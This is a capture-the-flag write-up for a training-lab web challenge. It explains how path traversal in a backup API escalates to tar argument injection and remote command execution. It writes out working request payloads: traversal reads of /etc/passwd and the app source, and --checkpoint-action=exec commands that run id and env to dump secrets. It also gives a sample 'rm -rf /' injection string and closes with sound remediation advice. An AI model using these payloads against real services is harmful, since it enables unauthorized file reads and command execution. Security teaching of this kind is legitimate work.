---
title: 'SnapArchive: Full Writeup'
description: "Path Traversal in SnapArchive's backup creation escalates into Argument Injection against tar (RCE), down to the flag stored in an environment variable."
event: 'FlagYard (Training Labs)'
category: 'web'
difficulty: 'easy'
tags:
  - path-traversal
  - argument-injection
  - tar
  - rce
  - gtfobins
pubDate: 2026-08-25
author: 'Niedson'
draft: false
---

> [!NOTE/About the challenge]
> **Platform:** FlagYard (Training Labs)
> **Category:** Web · **Difficulty:** Easy · **Points:** 120
> **Vulnerabilities:** Path Traversal (arbitrary file read) → escalated to **Argument Injection against `tar`** (remote command execution)
> **Flag:** `FlagY{...}` (dynamic: changes on every instance)

This writeup was written from scratch: even if you've never heard of CTF, "path traversal," or "command injection" before, the goal is that by the end you'll understand **why** each step was taken and **how** we reasoned our way to the flag.

---

## 1. Context: what is all this?

### 1.1. What is a CTF

A **CTF** (_Capture The Flag_) is an information security competition. Each challenge hides a **flag**: a secret string in a specific format (here, `FlagY{...}`): inside a deliberately vulnerable system. Your job is to find and exploit the flaw to "capture" that flag and prove you solved the challenge.

In **Web** category challenges, the target is a web application: a site running on a server. You interact with it like a regular user (or not so regular) and look for gaps in how it processes your requests.

### 1.2. The challenge: SnapArchive

SnapArchive describes itself as a _"Personal document backup & archiving service"_. The application (version 1.4.2) has four functions on screen:

1. **Add a document**: you type a _filename_ and text _content_, and submit. The document is stored in your "personal storage".
2. **Your documents**: lists the documents you've already uploaded, with selection checkboxes.
3. **Create backup**: you pick some documents (checking the boxes), give the backup a name, and the server **packages** those documents into a compressed archive for download.
4. **Backup archives**: lists the backups created, with a link to download each one.

Keep function 3 in mind: **packaging files**. It's the central piece of everything that follows.

---

## 2. The vulnerability concepts (explained from scratch)

Before touching the target, let's understand the two failure hypotheses an application like this naturally raises. They guided the entire investigation.

### 2.1. Hypothesis A: Path Traversal (in the filename)

**The core idea.** File systems are organized into folders (directories). A path like `/tmp/data/uploads/notas.txt` describes "go into `tmp`, then `data`, then `uploads`, and grab `notas.txt`".

There's a special shortcut: `..` means **"go back one folder"**. So:

```
/tmp/data/uploads/../  →  /tmp/data/
/tmp/data/uploads/../../  →  /tmp/
/tmp/data/uploads/../../../  →  /   (the system root)
```

**Where the danger lives.** Imagine the application always saves/reads files inside a "safe" folder, say `/tmp/data/uploads/`, and builds the path by concatenating the name **you** provided:

```
final_path = "/tmp/data/uploads/" + filename
```

If the developer blindly trusts `filename` and you send something like:

```
../../../etc/passwd
```

the final path becomes:

```
/tmp/data/uploads/../../../etc/passwd   →   /etc/passwd
```

In other words, you "escaped" the safe folder and reached a system file (`/etc/passwd`, a classic Linux file listing users). This is **Path Traversal** (also called _Directory Traversal_): using `../` to read (or write) files outside the intended folder.

In a backup service, the natural vector is the **filename** or the **list of files chosen for the backup**: if I can get the server to include `../../../etc/passwd` in the archive, I download the archive and read the content.

### 2.2. Hypothesis B: Command / Argument Injection (in backup creation)

**How programs "package" files.** To bundle several files into one (a `.zip` or `.tar.gz`), the laziest and most common approach is for the server to call an **external** command-line program, such as `tar` or `zip`. For example:

```
tar -czf backup.tar.gz file1.txt file2.txt
```

Here `tar` is the program, and the rest are **arguments**: `-czf` is an option (create, gzip, file), `backup.tar.gz` is the output name, and the `.txt` files are the ones to include.

**Command Injection.** If the server builds this command by pasting your text **inside a shell** (the command-line interpreter), special characters become weapons. In a shell, `;` separates commands, `|` pipes, `$(...)` and backticks run sub-commands. So a backup name like:

```
my-backup; rm -rf /
```

could turn into two commands: `tar` **and** an `rm -rf /`. This is **Command Injection**: getting the server to execute commands of your choosing.

**Argument Injection: subtler and crucial here.** Even if the server is careful and **doesn't** use a shell (passing each piece as a separate argument, without interpreting `;` or `$()`), there can still be a problem: if your text becomes an **argument** to the program, you may be able to inject **options** the program accepts.

Many command-line programs have dangerous options. `tar`, for instance, has the option `--checkpoint-action=exec=COMMAND`, which tells `tar` itself to **run a command** during packaging. If I can slip `--checkpoint-action=exec=...` into the argument list, `tar` runs my command: without needing any `;` or `$()`. This is cataloged on [GTFOBins](https://gtfobins.github.io/gtfobins/tar/), a repository of "tricks" involving Unix binaries.

> [!TIP/Hypothesis summary]
> Either I escape the folder with `../` to **read** files (A), or I abuse `tar`/`zip` during backup creation to **execute** something (B). As we'll see, the challenge requires **both ideas combined**.

---

## 3. Recon (understanding the target)

Every attack starts by mapping how the application works under the hood. Opening the application and inspecting the page's JavaScript, we found the front-end talks to three API **endpoints** (URLs the server responds to):

| Endpoint      | Method     | Purpose                   |
| ------------- | ---------- | ------------------------- |
| `/api/files`  | GET / POST | List and upload documents |
| `/api/backup` | GET / POST | List and create backups   |
| `/api/info`   | GET        | Service status            |

The first treasure came from `/api/info`:

```json
{
  "success": true,
  "service": "SnapArchive",
  "version": "1.4.2",
  "storage": {
    "uploadsDir": "/tmp/data/uploads",
    "backupsDir": "/tmp/data/backups",
    "uploadedFiles": 1,
    "backupArchives": 0
  }
}
```

This handed us **the real server-side paths**:

- Documents live in `/tmp/data/uploads`
- Backups live in `/tmp/data/backups`

Knowing that the "safe folder" is `/tmp/data/uploads` is gold: now I know exactly how many `../` I need to reach the system root `/` (three: `uploads` → `data` → `tmp` → `/`).

Listing documents (`GET /api/files`) showed a `readme.txt` already present. And `GET /api/backup` showed the list of backups (empty). Creating a test backup revealed the mechanism:

```json
{
  "success": true,
  "message": "Backup created successfully.",
  "archive": {
    "name": "backup-1787633214598.tar.gz",
    "path": "/tmp/data/backups/backup-1787633214598.tar.gz",
    "sizeBytes": 244
  }
}
```

Two important facts:

1. The backup is a **`.tar.gz`** → the server is almost certainly using the **`tar`** program (this connects directly to Hypothesis B).
2. The filename is auto-generated (`backup-<timestamp>.tar.gz`), ignoring the name I sent.

What about the download? Inspecting the front-end, the download link is:

```
GET /api/backup/<archive-name>
```

So the attack flow to **read** any file would be: _get the server to include it in a backup → download the `.tar.gz` → extract it → read the content._

---

## 4. Testing Hypothesis A: Path Traversal

The question now is direct: **is the list of files chosen for the backup validated?** If I send `../../../../etc/passwd` as if it were one of the "selected documents," does the server reject it or comply?

Backup creation is a `POST /api/backup` with a JSON body like this:

```json
{ "name": "my-backup", "files": ["readme.txt"] }
```

The `files` field is the list of documents. Let's abuse it. Testing a few paths:

```javascript
// Each attempt creates a backup requesting an "escaped" path be included
POST /api/backup   { "name": "t", "files": ["../../../../etc/passwd"] }   // → 200 OK ✅
POST /api/backup   { "name": "t", "files": ["../../../flag"] }           // → 502 (doesn't exist) ❌
POST /api/backup   { "name": "t", "files": ["/flag"] }                   // → 502 ❌
```

**`../../../../etc/passwd` worked** (it produced a 454-byte `.tar.gz`), while nonexistent paths gave a `502` error. In other words: **the path traversal is real**. The server doesn't validate the names: it passes them straight to `tar`.

To confirm, we downloaded the resulting `.tar.gz` and extracted it (this can be done right in the browser with the `DecompressionStream` API and a small `tar` format parser). Result:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
bun:x:1000:1000:...:/home/bun:/bin/bash
```

We read `/etc/passwd`! This confirms **arbitrary file read**. Note the `bun` user (uid 1000): the application runs on the **Bun** runtime (a JavaScript/TypeScript environment, an alternative to Node.js).

> [!NOTE/tar technical detail]
> When `tar` receives a path with `../`, it stores the file in the archive with the leading `../` stripped off (that's why the entry showed up as `etc/passwd`). The content, however, is that of the real file. And since `tar` **recurses into directories**, you can even request an entire folder and list its contents: that's how we mapped the system (see section 6).

---

## 5. Confirming from the source: reading the server code

Now that we have arbitrary read, we can read **the application's own source code** and understand exactly what's happening. Using the same traversal trick, we requested the `/app` folder:

```
app/run
app/package.json
app/public/index.html
app/src/server.ts
app/src/http-core.ts       ← the core logic
app/src/jail-server.ts
```

In `http-core.ts`, we found the heart of the backup feature:

```typescript
import { $ } from 'bun'; // Bun's "shell"

// ... further down, inside the /api/backup handler:

// (actual comment in the code:)
// "there was never a reported case of anyone typing a filename by hand
//  instead of clicking a checkbox, so stricter validation was de-scoped
//  for the v1.4 release."
for (const f of files) {
  if (typeof f !== 'string' || f.length === 0 || f.length > 300) {
    return badRequest("Each entry in 'files' must be a non-empty string (max 300 chars).");
  }
}

const archiveName = `${archiveBase}.tar.gz`;
const archivePath = path.join(BACKUP_DIR, archiveName);

// THE VULNERABLE LINE:
await $`tar -czf ${archivePath} -C ${UPLOAD_DIR} ${files}`.quiet();
```

Let's dissect this line, because it explains **everything**:

```
tar -czf <archivePath> -C /tmp/data/uploads <files...>
```

- `-c` creates an archive, `-z` compresses with gzip, `-f <archivePath>` sets the output file.
- `-C /tmp/data/uploads` tells `tar`: "change into this folder before grabbing the files".
- `<files...>` are the names **I** sent: each item in the `files` list becomes **a separate argument**.

And the validation? It only checks that each item is a string between 1 and 300 characters. **No check for `../`, `/`, or option-like strings.** The code's own comment admits that "stricter validation was de-scoped for the v1.4 release." This confirms Hypothesis A crystal-clear.

### What about Hypothesis B (classic command injection)?

Notice the Bun `` $`...` `` template. Bun's `$` template is a **safe shell**: it **automatically escapes** every interpolated value. So if I put `; id` or `$(id)` in a name, Bun treats it as literal text, not commands. We tried several payloads with `;`, `|`, `$()`, backticks: **all failed**. There's no command injection via shell metacharacters here.

It looks like a dead end for Hypothesis B... but it isn't. Keep this observation in mind: **each item of `files` becomes an argument to `tar`, and there's no `--` separating the options from the filenames.** We'll come back to this.

---

## 6. The twist: the flag isn't a regular file

With arbitrary read in hand, the most obvious thing is to look for the flag as a file. We exhaustively tested the classic locations:

```
/flag        /flag.txt      /flag.md      /flag.json
/app/flag.txt   /home/bun/flag.txt   /tmp/flag   /root/flag.txt
/etc/flag       /var/flag.txt   /srv/flag.txt   ...
```

**None existed.** We also mapped the system by requesting entire directories from `tar` (which recurses into folders):

- `/app`, `/home/bun`, `/tmp`, `/opt` → listed, **no flag**.
- `/etc`, `/var`, `/usr` → **failed completely**. Reason: if a folder contains **one** file the `bun` user isn't allowed to read (e.g. `/etc/shadow`), `tar` aborts with an error and the whole backup fails (`502`). This stops us from _listing_ those folders, though we could still read a specific file inside them if we knew its name.

We also confirmed that `/etc/passwd` only had the standard Debian users plus `bun`, with no suspicious user/home hiding the flag.

**Partial conclusion:** the flag **isn't on disk** (at least not under a guessable, readable name). This is a common challenge-design choice: the flag is **dynamic**, generated per instance and injected some other way: typically as an **environment variable**.

And here's the catch: a process's environment variables on Linux live in `/proc/<pid>/environ`. We tried reading that file via traversal... and it came back **empty (0 bytes)**. Why? Files inside `/proc` are "virtual": `tar` checks the file's size before reading it, the kernel reports size `0` for these files, and `tar` concludes there's nothing to copy. In other words: **path traversal through `tar` cannot read environment variables.**

We need something more powerful than "reading files". We need to **execute commands**.

---

## 7. Escalating to RCE: Argument Injection against `tar`

This is where the two hypotheses meet. Remember the observation at the end of section 5?

> [!IMPORTANT/Key point]
> Each item of `files` becomes an argument to `tar`, and **there's no `--`** separating the options from the filenames.

In Unix command-line programs, `--` is a marker meaning "options are over; everything after this is a filename, even if it starts with `-`". Since SnapArchive's command is:

```
tar -czf <output> -C /tmp/data/uploads <files...>
```

with no `--` before `<files...>`, `tar` will **interpret as an option** any item in my list that starts with `-` or `--`. And I control 100% of that list.

`tar` happens to have a pair of dangerous options (the GTFOBins trick):

- `--checkpoint=1`: makes `tar` emit a "checkpoint" on every record processed.
- `--checkpoint-action=exec=COMMAND`: **executes `COMMAND` at each checkpoint**.

Combining them: if I pass these two options as if they were "files", `tar` executes a command of mine. And the elegant part: this **doesn't depend on shell metacharacters**, so Bun's automatic escaping (which blocked classic command injection) **offers no protection here**: these are perfectly legitimate `tar` arguments.

### The payload

We sent `POST /api/backup` the following `files` list:

```json
{
  "name": "x",
  "files": [
    "--checkpoint=1",
    "--checkpoint-action=exec=id > /tmp/data/uploads/rce.txt 2>&1",
    "readme.txt"
  ]
}
```

What each item does:

- `--checkpoint=1` → triggers a checkpoint right at the first record.
- `--checkpoint-action=exec=id > /tmp/data/uploads/rce.txt 2>&1` → tells `tar` to run `id` and write the output inside the uploads folder (which I can read back!).
- `readme.txt` → a real file, so `tar` has something to package and actually reaches a checkpoint.

The command from `--checkpoint-action=exec=` is handed to a shell by `tar` itself (via `system()`), so redirections like `>` and `2>&1` work normally. That's why we wrote the output to a file inside `/tmp/data/uploads`: it then becomes a "document" we can download later.

Result: the backup returned success, and listing documents (`GET /api/files`) showed **`rce.txt`** right there. Reading its content (again via backup + download):

```
uid=1000(bun) gid=1000(bun) groups=1000(bun)
```

**We have remote command execution (RCE)** as the `bun` user. 🎯

> [!TIP/The challenge's trick]
> Path traversal (Hypothesis A) is a decoy: it solves "reading files," but the flag isn't a file. The same non-validation bug (passing user input straight into `tar` without `--`) lets you escalate from "read a file" to "run a command" (Hypothesis B, in the form of _argument injection_). You need both ideas.

---

## 8. Capturing the flag

With RCE, reading environment variables is trivial: just run `env`. We reused the technique, writing the output to a readable file:

```json
{
  "name": "x",
  "files": [
    "--checkpoint=1",
    "--checkpoint-action=exec=env > /tmp/data/uploads/env.txt 2>&1",
    "readme.txt"
  ]
}
```

Then we downloaded `env.txt`. Content (highlighting what matters):

```
TAR_ARCHIVE=/tmp/data/backups/backup-1787634304267.tar.gz
DATA_DIR=/tmp/data
TAR_FORMAT=gnu
DYN_FLAG=FlagY{9f49c4b20d513569a4e362e86340a2b7}      ← 🚩 THE FLAG
TAR_BLOCKING_FACTOR=20
PWD=/app
TAR_CHECKPOINT=1
TAR_VERSION=1.35
TAR_SUBCOMMAND=-c
```

The flag was in the **`DYN_FLAG`** environment variable (the `DYN` prefix reinforces that it's _dynamic_, generated per instance). The `TAR_*` variables also show up because they're set by `tar` itself for the `--checkpoint-action` process: a bonus confirming we're running inside `tar`'s context.

### 🚩 Flag

```
FlagY{9f49c4b20d513569a4e362e86340a2b7}
```

_(Yours will be different, since it's generated per instance.)_

---

## 9. Recap of the exploitation chain

```
1. Recon
   └─ /api/info leaks uploadsDir = /tmp/data/uploads
      → I know exactly how many "../" I need to reach "/"

2. Path Traversal (arbitrary read)
   └─ POST /api/backup { files: ["../../../../etc/passwd"] }
      → tar -czf out -C /tmp/data/uploads ../../../../etc/passwd
      → download the .tar.gz, extract it, read the file
      → read /etc/passwd and the source code in /app

3. Apparent dead end
   └─ the flag isn't a file on disk (it's an env var)
   └─ /proc/self/environ comes back empty via tar (virtual file, size 0)
      → reading files isn't enough; I need execution

4. Argument Injection against tar → RCE
   └─ the command has no "--", so items in "files" become tar OPTIONS
   └─ files: ["--checkpoint=1",
              "--checkpoint-action=exec=<command> > /tmp/data/uploads/out.txt",
              "readme.txt"]
      → tar runs my command; I write the output to the uploads folder
      → I read the output by downloading it as a backup

5. Capturing the flag
   └─ exec=env  →  DYN_FLAG=FlagY{...}
```

---

## 10. Why the application was vulnerable (and how to fix it)

The root of everything is **a single flaw**: passing user-controlled input directly as arguments to an external program, without validation. The Bun shell (`$`) protected against classic _command injection_ (metacharacters), but that gave a false sense of security: it protects against neither **path traversal** nor **argument injection**.

How to fix it, in layers:

1. **Validate filenames (allow-list).** Only accept simple names, e.g. matching a pattern like `^[A-Za-z0-9._-]{1,255}$`, **rejecting** any `/`, `..`, or names starting with `-`.
2. **Confirm the file actually belongs to the uploads directory.** Resolve the absolute path (`realpath`) and check that it starts with `/tmp/data/uploads/` before using it.
3. **Use the `--` separator** in the command: `tar -czf output -C /tmp/data/uploads -- file1 file2`. This alone kills the _argument injection_, since everything after `--` is treated as a filename, never as an option.
4. **Prefer a library over invoking external `tar`.** Packaging via a tar/zip library in the language itself eliminates the entire command-line argument-injection surface.
5. **Principle of least privilege.** Run the process with the bare minimum needed, and don't leave secrets (like the flag/credentials) in environment variables of the same process that handles user input.

---

## 11. Takeaways

- **Path traversal** is all about `..`: any place where the application uses a name/path you supply to access disk is a candidate. Discovering the base directory (here, via `/api/info`) makes the attack precise.
- **"No shell" isn't the same as "safe".** Escaping metacharacters prevents _command injection_, but if your text becomes an **argument** to a binary, you can still inject **options**, and many binaries have options that execute commands (`tar --checkpoint-action`, `--to-command`, `--use-compress-program`; `zip -T -TT`, etc.: see GTFOBins).
- **Always use `--`** when building commands with user input, and validate the format of names.
- **When file reads don't find the flag, think about environment variables**, and remember that `/proc/.../environ` isn't read by tools that trust the file's reported size (like `tar`); in that case you need to escalate to command execution.
- **Read the source code when you can.** Arbitrary read became our best recon tool: the "de-scoped for v1.4" comment and the `tar` line missing `--` handed us the whole path.

---

_Writeup for the SnapArchive challenge (FlagYard · Web · Easy)._
